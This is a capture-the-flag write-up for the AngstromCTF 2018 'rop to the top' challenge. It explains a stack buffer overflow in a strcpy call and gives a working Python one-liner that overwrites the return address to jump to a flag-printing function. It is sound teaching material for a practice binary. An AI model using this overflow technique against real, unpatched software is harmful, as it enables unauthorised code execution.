# rop to the top

## Description

Here's some binary and source. Navigate to /problems/roptothetop/ on the shell server to try your exploit out!

hint: Look up "Return Oriented Programming" (ROP) vulnerabilities
and figure out how you might be able to change the return address.

## Solving

First, as always, I ran the binary. Here is what I saw:
<pre><font color="#EF2929"><b>root@kali</b></font>:<font color="#729FCF"><b>/mnt/hgfs/Shared</b></font># mv ./rop_to_the_top32 ./rop32
<font color="#EF2929"><b>root@kali</b></font>:<font color="#729FCF"><b>/mnt/hgfs/Shared</b></font># ./rop32
Usage: ./rop_to_the_top32 &lt;inputString&gt;
<font color="#EF2929"><b>root@kali</b></font>:<font color="#729FCF"><b>/mnt/hgfs/Shared</b></font># ./rop32 &quot;some string&quot;
Now copying input...
Done!
</pre>

So the program takes one string argument and just does something with it. Now let's seee the source code.
```C
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

void the_top(){

    system("/bin/cat flag");

}

void fun_copy(char *input){

    char destination[32];
    strcpy(destination, input);
    puts("Done!");
}

int main (int argc, char **argv){
    gid_t gid = getegid();
    setresgid(gid,gid,gid);

    if (argc == 2){
        puts("Now copying input...");
        fun_copy(argv[1]);
    } else {
        puts("Usage: ./rop_to_the_top32 <inputString>");
    }

    return 0;
}
```

The program is actually copies the input to the buffer (destination variable). Still, as I can see, there is no limitation for the input, but the buffer has only 32 bytes of length. So, I can overflow the buffer. Another important thing is that there is a function "the_top" which actually prints the flag. Now I need to figure out how can I use the buffer overflowing to call "the_top", so I can get the flag.

I decided to look this program in the IDA. I found function "fun_copy" and looked into it's stack. Here's the destination variable's start:

![dest_starts](https://raw.githubusercontent.com/0awawa0/CTF-Writeups/master/AngstromCTF%202018/Binary/rop%20to%20the%20top%20(130)/src/dest_starts.PNG)

I need the buffer's start offset. It's -28h. And here I see the end of the buffer and the main thing is that here you can see the variable called 'r'. It's a return address (the address of the command that will be executed after the function finishes it's work). And I can rewrite it's value, overflowing the buffer.

![return_address](https://raw.githubusercontent.com/0awawa0/CTF-Writeups/master/AngstromCTF%202018/Binary/rop%20to%20the%20top%20(130)/src/return_offset.PNG)

And I need it's offset too. It's +04h. So, there is ```4h-(-28h)=2Ch=44``` bytes from the start of the buffer and to the start of the return address. Now, I need to write 44 bytes to the input and 4 more bytes to rewrite return address.

Next, I found the function's "the_top" address. Here you can see it (08 04 84 DB):

![address](https://raw.githubusercontent.com/0awawa0/CTF-Writeups/master/AngstromCTF%202018/Binary/rop%20to%20the%20top%20(130)/src/addressPNG.PNG)

Okay, now I have everything to get the flag. But I can't write the address from the keyboard, cause it's non-printable bytes. So I will use Python to do it. So, let's do it:

<pre><font color="#EF2929"><b>oot@kali</b></font>:<font color="#729FCF"><b>/mnt/hgfs/Shared</b></font># ./rop32 &quot;`python -c \&quot;print &apos;A&apos;*44 + &apos;\xdb\x84\x04\x08&apos;&quot;`&quot;
Now copying input...
Done!
actf{strut_your_stuff}
Segmentation fault
</pre>